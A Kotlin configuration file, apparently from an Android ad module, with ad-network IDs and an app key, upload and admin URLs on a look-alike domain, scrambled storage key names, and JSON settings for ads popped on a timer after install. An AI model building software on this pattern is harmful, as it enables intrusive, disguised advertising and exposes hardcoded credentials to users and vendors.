package com.even.zining.inherit.sound.tool.data

import androidx.annotation.Keep
import com.even.zining.inherit.sound.start.FnnStartFun

// 1. 定义环境枚举
enum class EnvironmentType {
    TEST, PRODUCTION
}

@Keep
object FnnLoadData {

    const val fffmmm = "bmfkgfnn"
    const val reladRu = "com.thunderbolt.methods.bodhisattva.ui.guide.Guide2Activity"
    const val reladRu2 = "com.thunderbolt.methods.bodhisattva.ui.guide.GuideActivity"

    private val configMap = mapOf(
        EnvironmentType.TEST to Config(
            appidPangle = "8580262",
            appidTopon = "h670e13c4e3ab6",
            appkeyTopon = "ac360a993a659579a11f6df50b9e78639",
            openidTopon = "n1fvmhio0uchmj",
            upUrl = "https://test-lind.pubilsphinformationchek.com/workman/harrow/bathe",
            adminUrl = "https://coti.pubilsphinformationchek.com/apitest/fnn/pp/",
            appsId = "i3w87P32U399MCPKjzJmdD"
        ),
        EnvironmentType.PRODUCTION to Config(
            appidPangle = "",
            appidTopon = "",
            appkeyTopon = "",
            openidTopon = "",
            upUrl = "https://lind.pubilsphinformationchek.com/year/sanguine/adulate",
            adminUrl = "https://coti.pubilsphinformationchek.com/api/fnn/pp/",
            appsId = "ZHErc2nQGxqFdbtRw8Cwi9"
        )
    )

    // 3. 动态获取当前环境（替换原来的 isXS 逻辑）
    fun getCurrentEnvironment(isXS: Boolean = FnnStartFun.mustXS): EnvironmentType {
        return if (isXS) EnvironmentType.PRODUCTION else EnvironmentType.TEST
    }

    // 4. 通过环境类型获取配置
    fun getConfig(env: EnvironmentType = getCurrentEnvironment()): Config {
        return configMap[env] ?: throw IllegalArgumentException("Invalid environment")
    }

    @Keep
    data class Config(
        val appidPangle: String,
        val appidTopon: String,
        val appkeyTopon: String,
        val openidTopon: String,
        val upUrl: String,
        val adminUrl: String,
        val appsId: String
    )

    const val json_data_sm = """
        {
    "config": {
        "user": {
            "isUploader": 123,//各个位数相加偶数是A用户；奇数是B用户
            "level": 1 // 1:可以上传,其他不可以上传
        },
        },
        "scheduler": {
            "loopInterval": 60,//定时检测时间
            "initialDelay": 10,//距离安装时间后弹广告
            "displayGap": 10,//广告展示间隔
            "retryCap": 100 //失败上线
        },
        "adLimits": [3,6,3],// 小时展示上限,天展示上限,天点击上限
        "identifiers": [
            {
                "tag": "981772962",// pangle AD ID 下发
                "platform": "adPangle" // ad字段不能修改
            },
            {
                "tag": "n1fvkei1g11lcv",//  topon AD ID 下发
                "platform": "adTopon" // ad字段不能修改
            },
            {
                "tag": "3616318175247400", // FB ID 下发
                "platform": "facebook" // facebook字段不能修改
            }
        ],
        "delayRange": "2000-3000",// 随机延迟起始时间-随机延迟结束时间
        "internalLink": {
            "address": "https://www.baidu.com" // 体内 H5 广告链接
        }
    }
}
    """


    const val json_data = """
{
    "config": {
        "user": {
            "isUploader": 123,
            "level": 1
        },
        "scheduler": {
            "loopInterval": 20,
            "initialDelay": 10,
            "displayGap": 10,
            "retryCap": 100
        },
        "adLimits": [
            3,
            6,
            3
        ],
        "identifiers": [
            {
                "tag": "981772962",
                "platform": "adPagle"
            },
            {
                "tag": "n1fvkei1g11lcv",
                "platform": "adTopon"
            },
            {
                "tag": "3616318175247400",
                "platform": "facebook"
            }
        ],
        "delayRange": "2000-3000ms",
        "internalLink": {
            "address": "https://www.baidu.com"
        }
    }
}
    """




    const val firstPoint="rstPfioint"
    const val adOrgPoint="rgPoadOint"
    const val getlimit="tlimiet"
    const val fcmState="Statfcme"
    const val admindata="mindadata"
    const val refdata="fdatrea"
    const val appiddata="iddaappta"
    const val IS_INT_JSON="ntJsoisIn"
    const val isAdFailCount="dFailCoisAunt"
    const val adFailPost="ailPadFost"


    const val adHourShowNum="ourShadHowNum"
    const val adHourShowDate="ourShowadHDate"
    const val adDayShowNum="yShowNadDaum"
    const val adDayShowDate="ShowDaadDayte"

    const val adClickNum="ClickNadum"


}


